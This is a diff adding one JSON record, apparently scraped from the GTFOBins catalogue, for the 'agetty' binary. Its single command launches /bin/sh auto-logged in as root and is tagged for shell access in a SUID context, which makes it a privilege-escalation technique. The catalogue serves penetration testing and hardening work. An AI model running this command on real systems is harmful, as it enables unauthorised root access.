@@ -1,0 +1,1 @@
+{"title": "agetty", "source": "gtfobins", "source_label": "GTFOBins", "path": "agetty", "html": "<h1>agetty</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">agetty -l /bin/sh -o -p -a root tty</code></pre>", "excerpt": "agetty Shell agetty -l /bin/sh -o -p -a root tty", "tags": ["func:shell", "ctx:suid"]}
